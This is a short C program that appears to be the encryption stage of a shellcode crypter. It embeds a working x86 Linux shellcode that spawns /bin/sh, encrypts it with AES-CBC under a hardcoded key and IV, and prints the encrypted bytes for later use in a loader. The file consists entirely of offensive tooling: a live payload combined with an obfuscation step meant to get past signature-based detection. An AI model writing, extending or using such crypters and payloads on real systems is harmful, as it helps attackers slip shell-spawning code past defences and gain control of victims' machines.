#include <stdio.h>
#include <string.h>
#include "aes.h"
#define CBC 1

unsigned char code[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90";

int main()
{
	size_t shellcodeSize = sizeof(code);

	unsigned char key[] = "0123456789abcdef0123456789abcdef";
	unsigned char iv[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, code, shellcodeSize);

	printf("AES Encrypted Shellcode: \n");

	for (int i = 0; i < shellcodeSize - 1; i++) {
		printf("\\x%02x", code[i]);
	}

	printf("\n");
}	
